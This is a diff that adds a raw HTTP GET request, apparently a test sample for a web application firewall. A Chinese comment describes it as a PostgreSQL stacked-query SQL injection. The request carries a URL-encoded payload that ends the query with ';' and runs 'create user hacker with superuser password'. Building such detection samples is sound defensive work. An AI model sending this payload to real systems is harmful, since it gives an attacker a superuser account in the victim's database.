@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506343
+# 攻击者基于堆叠查询，将"create user hacker with superuser password '123'"语句注入到 SQL 查询参数中，利用";"执行多条sql语句从而注册超级用户。
+GET /?id=1%3Bcreate%20user%20hacker%20with%20superuser%20password%20%27123%27&bid=hd_tag_m8mv23z5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23z5
+RM-PRO-Token: 59788439d0e40b9e7d2c3ace6075bebf
+RM-PRO-Time: 1742808354798
+User-Agent: curl/7.83.1
+
